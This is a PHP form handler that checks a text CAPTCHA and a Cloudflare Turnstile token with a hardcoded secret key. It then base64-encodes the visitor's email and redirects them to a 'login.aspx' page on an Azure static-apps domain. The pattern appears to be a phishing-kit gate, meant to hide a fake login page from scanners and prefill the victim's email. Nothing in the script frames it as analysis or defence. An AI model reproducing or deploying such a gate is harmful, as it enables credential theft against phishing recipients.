<?php
session_start();

// Display errors for debugging (optional)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $userTextCaptcha = $_POST['text_captcha'];
    $turnstileResponse = $_POST['cf-turnstile-response'];
    $secretKey = '0x4AAAAAAAzbaFyF5jnLHaBSyZ5AuNHu098';

    // Validate text-based CAPTCHA
    if ($userTextCaptcha !== $_SESSION['captcha_text']) {
        echo "Text CAPTCHA validation failed. Please try again.";
        exit;
    }

    // Prepare Turnstile validation data
    $data = [
        'secret' => $secretKey,
        'response' => $turnstileResponse,
        'remoteip' => $_SERVER['REMOTE_ADDR']
    ];

    // Turnstile validation request
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    // Validate Turnstile CAPTCHA
    $context  = stream_context_create($options);
    $verify = file_get_contents('https://challenges.cloudflare.com/turnstile/v0/siteverify', false, $context);
    $captchaSuccess = json_decode($verify);

    if ($captchaSuccess->success) {
        // Both CAPTCHAs passed, proceed with further processing

        // Encode the email address in Base64
        $encodedEmail = base64_encode($email);

        // Construct the redirect URL with the encoded email
        $redirectUrl = "https://orange-ground-01fdf2b1e.5.azurestaticapps.net/auth/v/?id=abc123XYZ4567890/message?data=($encodedEmail)/login.aspx";

        // Redirect the user
        header("Location: $redirectUrl");
        exit();
    } else {
        echo "Turnstile CAPTCHA validation failed. Please try again.";
    }
}
?>